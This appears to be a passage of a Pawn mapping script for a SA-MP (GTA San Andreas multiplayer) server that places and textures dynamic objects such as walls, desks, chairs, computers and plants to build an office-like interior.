	mariaintaa = CreateDynamicObjectEx(19454,1446.470,-1720.216,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1446.473,-1737.937,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19439,1446.472,-1737.936,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1446.472,-1737.936,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1446.471,-1726.639,1056.300,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1461.859,-1742.774,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1472.360,-1742.774,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1468.220,-1752.562,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1447.078,-1752.406,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1440.866,-1742.769,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1441.135,-1733.142,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1441.131,-1723.510,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1458.146,-1762.260,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1451.178,-1733.868,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1451.180,-1724.237,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1451.182,-1714.603,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1461.681,-1714.603,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1472.181,-1714.602,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1461.681,-1724.236,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1461.681,-1733.867,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1472.181,-1724.236,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1472.181,-1733.867,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1459.409,-1742.904,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);

	mariaintaa = CreateDynamicObjectEx(19461,1468.382,-1728.403,1049.302,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1468.390,-1724.725,1049.302,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1458.755,-1728.403,1049.302,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1458.756,-1724.725,1049.302,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1459.546,-1719.819,1049.302,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1455.871,-1719.819,1049.302,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1459.546,-1733.309,1049.302,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1455.871,-1733.309,1049.302,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1449.119,-1724.725,1049.302,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1449.119,-1728.403,1049.302,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1502,1456.974,-1738.020,1051.044,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1454.179,-1725.629,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1454.179,-1726.555,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2423,1454.106,-1728.512,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1729.682,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1731.540,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1730.613,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1454.179,-1727.480,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2423,1454.180,-1724.708,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2423,1453.142,-1728.641,1051.050,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1732.469,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1733.397,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1734.319,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1735.243,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1736.173,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1737.099,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.069,-1738.031,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1731.732,1053.696,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2423,1453.081,-1724.428,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1723.500,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1722.581,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1721.650,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1720.723,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1719.800,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1718.874,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1717.949,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1717.026,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1716.105,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2424,1453.083,-1715.175,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1717.145,1053.696,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1721.473,1053.696,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1736.109,1053.696,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1731.731,1053.696,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1453.233,-1735.899,1052.105,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1453.234,-1721.823,1052.105,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1453.234,-1717.290,1052.105,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2166,1447.045,-1716.495,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2166,1448.033,-1737.485,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1721.473,1053.696,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1717.145,1053.696,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1453.234,-1731.724,1052.105,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2165,1450.964,-1737.380,1051.050,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2165,1450.200,-1715.570,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1451.812,-1721.626,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1447.676,-1716.362,1051.050,0.000,0.000,39.995,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1450.835,-1716.002,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1452.092,-1716.512,1051.050,0.000,0.000,240.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1452.001,-1735.871,1051.050,0.000,0.000,300.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1451.980,-1731.538,1051.050,0.000,0.000,269.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1447.671,-1737.078,1051.050,0.000,0.000,129.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1450.327,-1736.612,1051.050,0.000,0.000,189.990,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1723,1447.150,-1730.984,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1723,1447.150,-1724.193,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2162,1446.543,-1723.488,1053.171,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2162,1446.567,-1730.390,1053.171,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2164,1446.562,-1733.047,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2199,1446.598,-1718.449,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19174,1449.952,-1715.010,1053.515,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19172,1449.287,-1737.934,1053.621,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19165,1446.556,-1734.901,1053.896,90.000,90.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2164,1446.560,-1720.736,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2191,1447.030,-1735.149,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1714,1452.859,-1725.739,1051.050,0.000,0.000,70.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1714,1452.873,-1727.451,1051.050,0.000,0.000,109.999,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1649,1453.409,-1736.109,1053.696,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2008,1465.866,-1736.092,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2008,1465.866,-1733.093,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1466.680,-1732.659,1051.050,0.000,0.000,69.999,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1466.512,-1735.400,1051.050,0.000,0.000,119.999,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2161,1468.765,-1731.978,1052.663,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2162,1468.782,-1735.326,1052.322,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2199,1468.711,-1733.696,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(633,1467.819,-1730.791,1052.043,0.000,0.000,319.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1723,1463.737,-1737.354,1051.050,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1724,1460.635,-1736.691,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1460.678,-1734.847,1051.676,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1464.662,-1731.963,1051.676,0.000,0.000,139.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1464.581,-1733.258,1051.676,0.000,0.000,219.993,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1464.760,-1735.550,1051.676,0.000,0.000,179.989,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1726,1467.312,-1715.411,1051.050,0.000,0.000,300.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1727,1468.300,-1718.948,1051.050,0.000,0.000,209.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1727,1463.904,-1716.636,1051.050,0.000,0.000,65.989,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2293,1466.156,-1716.484,1051.050,0.000,0.000,30.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2270,1460.451,-1729.394,1053.417,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2268,1460.362,-1723.782,1053.026,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2265,1460.508,-1721.183,1053.162,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2263,1461.755,-1722.555,1052.691,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2262,1459.115,-1722.431,1052.928,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2259,1459.176,-1730.682,1052.779,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2754,1469.671,-1729.426,1051.952,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1302,1471.288,-1729.571,1051.050,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1775,1469.941,-1723.739,1052.146,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1776,1471.577,-1723.727,1052.149,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1455.947,-1752.576,1049.306,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1459.475,-1752.579,1049.303,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1491,1456.050,-1743.649,1051.051,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(14782,1452.531,-1746.645,1052.066,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2389,1451.555,-1746.691,1052.619,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2704,1450.756,-1746.467,1052.298,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2386,1453.802,-1746.813,1053.206,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2052,1452.389,-1746.786,1053.103,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1704,1454.833,-1739.667,1051.050,0.000,0.000,320.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1723,1451.651,-1739.745,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1704,1449.764,-1740.260,1051.050,0.000,0.000,39.996,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(633,1467.976,-1737.117,1052.043,0.000,0.000,309.995,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19174,1452.656,-1739.043,1053.395,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2373,1448.916,-1747.105,1051.050,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2382,1448.359,-1746.623,1051.635,0.000,0.000,88.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2706,1447.510,-1746.624,1051.696,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2392,1448.796,-1746.548,1052.589,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1459.970,-1736.055,1053.113,90.000,180.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2815,1453.922,-1746.135,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2815,1448.688,-1746.172,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2315,1451.901,-1741.229,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2816,1453.187,-1741.207,1051.546,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2251,1451.854,-1741.265,1052.389,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(632,1448.803,-1740.305,1051.475,0.000,0.000,356.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1463.038,-1755.435,1053.300,90.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1452.389,-1749.662,1053.300,90.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1452.409,-1755.376,1053.300,90.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1459.475,-1762.343,1049.326,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19461,1455.947,-1762.343,1049.326,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1502,1456.974,-1747.706,1051.044,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2207,1456.772,-1763.935,1051.137,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2208,1457.725,-1763.046,1051.048,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2614,1457.699,-1766.915,1054.305,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(14455,1461.588,-1764.323,1052.701,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19168,1453.890,-1762.890,1054.201,90.000,90.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19169,1453.890,-1761.394,1054.201,90.000,90.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19170,1453.890,-1762.890,1052.704,90.000,90.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19171,1453.890,-1761.394,1052.704,90.000,90.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2292,1454.463,-1758.064,1051.048,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2292,1460.947,-1758.063,1051.048,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2292,1460.967,-1766.387,1051.048,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2292,1454.442,-1766.406,1051.048,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2167,1453.932,-1759.900,1051.048,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2167,1453.932,-1764.255,1051.048,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2811,1456.562,-1757.979,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2811,1458.978,-1757.941,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1714,1456.296,-1762.090,1051.050,0.000,0.000,72.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1714,1456.353,-1760.890,1051.050,0.000,0.000,117.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1714,1459.003,-1760.151,1051.050,0.000,0.000,303.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1714,1458.939,-1761.779,1051.050,0.000,0.000,253.997,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1671,1457.711,-1765.043,1051.451,0.000,0.000,176.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2164,1458.036,-1766.941,1051.050,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2827,1457.712,-1761.909,1051.913,0.000,0.000,80.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(14705,1457.661,-1763.546,1052.114,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2008,1446.777,-1754.681,1051.048,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2008,1446.777,-1752.052,1051.048,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2008,1446.777,-1749.276,1051.048,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2183,1466.524,-1755.375,1051.048,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1446.076,-1753.052,1051.048,0.000,0.000,297.999,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1445.744,-1750.113,1051.048,0.000,0.000,267.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1445.817,-1755.316,1051.048,0.000,0.000,261.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2183,1466.490,-1751.238,1051.048,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2199,1442.819,-1752.708,1051.048,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2164,1442.780,-1756.005,1051.048,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2164,1442.877,-1749.800,1051.048,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1468.921,-1752.142,1051.048,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1467.041,-1752.196,1051.048,0.000,0.000,342.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1466.954,-1753.517,1051.048,0.000,0.000,219.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1468.895,-1753.318,1051.048,0.000,0.000,161.995,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1468.965,-1749.105,1051.048,0.000,0.000,143.995,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1467.291,-1749.012,1051.048,0.000,0.000,101.992,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1466.625,-1756.146,1051.048,0.000,0.000,293.995,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2356,1468.708,-1756.203,1051.048,0.000,0.000,331.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1469.196,-1754.947,1051.833,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2162,1442.754,-1751.421,1053.547,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1467.166,-1754.961,1051.833,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2162,1442.753,-1754.383,1053.547,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1448.378,-1751.819,1051.675,0.000,0.000,29.989,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1447.993,-1753.140,1051.675,0.000,0.000,319.987,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1447.970,-1749.748,1051.675,0.000,0.000,359.987,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1448.203,-1755.160,1051.675,0.000,0.000,359.983,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1450.546,-1748.279,1051.675,0.000,0.000,89.983,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1449.682,-1748.279,1051.675,0.000,0.000,89.983,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1451.444,-1748.279,1051.675,0.000,0.000,89.983,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1468.880,-1754.433,1051.843,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1451.444,-1756.656,1051.675,0.000,0.000,269.983,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1450.546,-1756.656,1051.675,0.000,0.000,269.978,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1811,1449.682,-1756.656,1051.675,0.000,0.000,269.978,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1467.066,-1754.421,1051.843,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1467.058,-1750.260,1051.843,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1468.760,-1750.307,1051.843,0.000,0.000,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19173,1446.894,-1757.220,1053.432,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1469.012,-1750.805,1051.843,0.000,0.000,1.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2190,1467.235,-1750.819,1051.843,0.000,0.000,1.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19174,1446.943,-1747.766,1053.545,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1546,1466.459,-1750.062,1051.939,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2824,1466.525,-1754.177,1051.859,0.000,0.000,174.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2855,1468.340,-1755.228,1051.834,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2164,1472.522,-1748.259,1051.048,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2164,1472.522,-1755.932,1051.048,0.000,0.000,270.000,250.000,250.000);
